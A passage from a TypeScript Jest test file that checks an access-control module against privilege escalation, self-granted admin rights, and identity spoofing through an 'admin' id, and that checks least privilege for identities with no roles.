      // Verify attacker doesn't have admin
      expect(accessControl.isAdmin(attackerIdentity)).toBe(false);

      // Admin assigns admin role
      accessControl.setIdentity(adminIdentity);
      accessControl.assignRole(attackerIdentity, Role.ADMIN);

      // Now attacker has admin
      expect(accessControl.isAdmin(attackerIdentity)).toBe(true);
    });
  });

  describe('Defense in Depth - Combined Attack Scenarios', () => {
    it('should prevent multi-stage privilege escalation', () => {
      // Scenario: Attacker tries to escalate privileges through multiple steps
      accessControl.setIdentity(attackerIdentity);
      accessControl.assignRole(attackerIdentity, Role.USER);

      // Step 1: Try to create high-privilege role (should fail)
      expect(() =>
        accessControl.createRole({
          name: 'high-priv',
          permissions: [Permission.DELETE],
        })
      ).toThrow('Admin permission required');

      // Step 2: Try to grant self admin permission (should fail)
      expect(() =>
        accessControl.grantPermissions({
          identityId: attackerIdentity.id,
          identityType: attackerIdentity.type,
          service: 'admin',
          permissions: [Permission.ADMIN],
        })
      ).toThrow('Admin permission required');

      // Step 3: Try to assign admin role to self (should fail)
      expect(() => accessControl.assignRole(attackerIdentity, Role.ADMIN)).toThrow(
        'Admin permission required'
      );

      // Verify attacker still has no admin
      expect(accessControl.isAdmin(attackerIdentity)).toBe(false);
    });

    it('should enforce principle of least privilege', () => {
      // New identity with no roles should have zero permissions
      const newIdentity: Identity = { id: 'new-user', type: 'user' };

      const check = accessControl.checkPermission(
        Permission.READ,
        'any-service',
        undefined,
        newIdentity
      );

      expect(check.allowed).toBe(false);
      expect(check.effectivePermissions).toEqual([]);
    });

    it('should prevent identity spoofing via name manipulation', () => {
      // Even if attacker uses id "admin", they shouldn't get admin privileges
      const spoofedIdentity: Identity = { id: 'admin', type: 'user' };

      expect(accessControl.isAdmin(spoofedIdentity)).toBe(false);

      const check = accessControl.checkPermission(
        Permission.DELETE,
        'critical-service',
        undefined,
        spoofedIdentity
      );

      expect(check.allowed).toBe(false);
    });
  });
});
